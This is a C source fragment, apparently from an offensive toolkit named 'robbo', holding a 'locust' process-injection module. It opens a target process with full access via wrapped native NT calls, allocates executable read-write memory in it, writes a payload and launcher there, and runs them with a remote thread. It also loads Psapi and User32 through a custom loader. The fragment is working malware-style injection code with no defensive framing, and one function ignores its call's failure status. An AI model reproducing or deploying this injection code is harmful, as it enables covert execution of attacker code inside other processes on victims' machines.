// ---------------------------------- LOCUST FUNCTIONS ---------------------------------------------

HANDLE robbo_locust_open_process_info(DWORD pid) {
    OBJECT_ATTRIBUTES objAtt;
    ROBBO_INITIALIZE_OBJECT_ATTRIBUTES(&objAtt, NULL, 0, NULL, NULL);
    HANDLE hProc;
    CLIENT_ID cliID;
    cliID.UniqueProcess = (PVOID)(uintptr_t)pid;
    cliID.UniqueThread = 0;
    NTSTATUS result = robbo_wapi_NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAtt, &cliID);
    if (result != 0) {
        return 0;
    }
    else {
        return hProc;
    }
}

HANDLE robbo_locust_open_process_full(DWORD pid) {
    OBJECT_ATTRIBUTES objAttr;
    ROBBO_INITIALIZE_OBJECT_ATTRIBUTES(&objAttr, NULL, 0, NULL, NULL);
    HANDLE hProc;
    CLIENT_ID cliID;
    cliID.UniqueProcess = (PVOID)(uintptr_t)pid;
    cliID.UniqueThread = 0;
    NTSTATUS result = robbo_wapi_NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &objAttr, &cliID);
    return hProc;
}

int robbo_locust_inject_payload_basic(DWORD pid, PVOID payload, int payload_size, PVOID func_launch, int flaunch_size) {
    HANDLE proc = robbo_locust_open_process_full(pid);
    if (!proc) {
        return 0;
    }
    PVOID pAddr = NULL;
    SIZE_T pSize = payload_size + 256;
    NTSTATUS pAlloc = robbo_wapi_NtAllocateVirtualMemory(proc, &pAddr, 0, &pSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pAlloc != 0) {
        goto CLOSE_HANDLE;
    }

    SIZE_T pbWriten;
    NTSTATUS pWrite = robbo_wapi_NtWriteVirtualMemory(proc, pAddr, payload, payload_size, &pbWriten);
    if (pWrite != 0 ) {
        goto CLOSE_HANDLE;
    }

    PVOID fAddr = NULL;
    SIZE_T fSize = flaunch_size;
    NTSTATUS fAlloc = robbo_wapi_NtAllocateVirtualMemory(proc, &fAddr, 0, &fSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (fAlloc != 0) {
        goto CLOSE_HANDLE;
    }
    SIZE_T fbWriten;
    NTSTATUS fWrite = robbo_wapi_NtWriteVirtualMemory(proc, fAddr, func_launch, flaunch_size, &fbWriten);
    if (fWrite != 0 ) {
        goto CLOSE_HANDLE;
    }

    HANDLE myTh;
    NTSTATUS sThread = robbo_wapi_NtCreateThreadEx(&myTh, THREAD_ALL_ACCESS, 0, proc, fAddr, pAddr, 0, 0, 0, 0, 0);
    if (sThread != 0) {
        goto CLOSE_HANDLE;
    }

    robbo_wapi_NtClose(proc);
    return 1;



    CLOSE_HANDLE:
        robbo_wapi_NtClose(proc);
        return 0;
}


// ----------------------------------- INIT FUNCTIONS --------------------------------------------------

void robbo_locust_init_test(void) {
    return;
}

void robbo_locust_initialize(void) {
    robbo_addr_psapi_dll = robbo_load_dll_ldr(raw_name_Psapi_dll);
    robbo_addr_user32_dll = robbo_load_dll_ldr(raw_name_User32_dll);
}

